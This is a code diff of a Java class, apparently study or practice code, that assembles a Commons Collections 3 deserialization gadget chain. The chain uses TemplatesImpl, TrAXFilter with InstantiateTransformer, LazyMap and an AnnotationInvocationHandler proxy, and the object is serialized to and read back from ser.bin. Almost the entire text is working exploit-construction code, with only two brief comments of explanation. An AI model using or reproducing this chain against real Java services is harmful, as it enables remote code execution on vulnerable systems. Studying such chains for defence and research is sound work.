@@ -40,58 +40,34 @@ public class cc3 {
         word.set(templates,codes);
 //        templates.newTransformer();
 
-
-//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
-//
-//
-//        //     templates.newTransformer();
-//
-        Transformer[] transformers = new Transformer[] {
-                new ConstantTransformer(templates),
-                new InvokerTransformer("newTransformer",null,null)
+        
+        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},
+                new Object[]{templates});
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(TrAXFilter.class), // 构造 setValue 的可控参数
+                instantiateTransformer
         };
         ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
-//        chainedTransformer.transform(1);
-        HashMap<Object,Object> hash = new HashMap<Object, Object>();
-        Map<Object,Object> lazymap = LazyMap.decorate(hash,chainedTransformer);
-        //lazymap.get("key");
+        HashMap<Object, Object> hashMap = new HashMap<>();
+        Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);
+
+
+        
+
         Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
+        declaredConstructor.setAccessible(true);
+        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);
 
-        Constructor constructor = c.getDeclaredConstructor(Class.class,Map.class);
+        Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()
+                , new Class[]{Map.class}, invocationHandler);
+        Object o = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);
 
-        constructor.setAccessible(true);
-        InvocationHandler instance = (InvocationHandler) constructor.newInstance(Target.class,lazymap);
-        Map proxyInstance = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},instance);
-        Object o = constructor.newInstance(Override.class,proxyInstance);
-
-        serialize(o);
-        unserialize("ser.bin");
-
-
-//        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
-//        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
-//        //设置构造方法为可访问的
-//        constructor.setAccessible(true);
-//        //通过反射创建 Override 类的代理对象 instance,并设置其调用会委托给 decorate 对象
-//        InvocationHandler instance = (InvocationHandler) constructor.newInstance(Override.class, lazymap);
-//
-//        //创建Map接口的代理对象proxyInstance,并设置其调用处理器为instance
-//        Map proxyInstance = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, instance);
-//        //再次通过反射创建代理对象
-//        Object o = constructor.newInstance(Override.class, proxyInstance);
 //        serialize(o);
-//        unserialize("ser.bin");
-
-
-
-
-
+        unserialize("ser.bin");
+        
     }
-
-
-
-
-
+    
     public static void serialize(Object obj) throws Exception {
         ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
         oos.writeObject(obj);
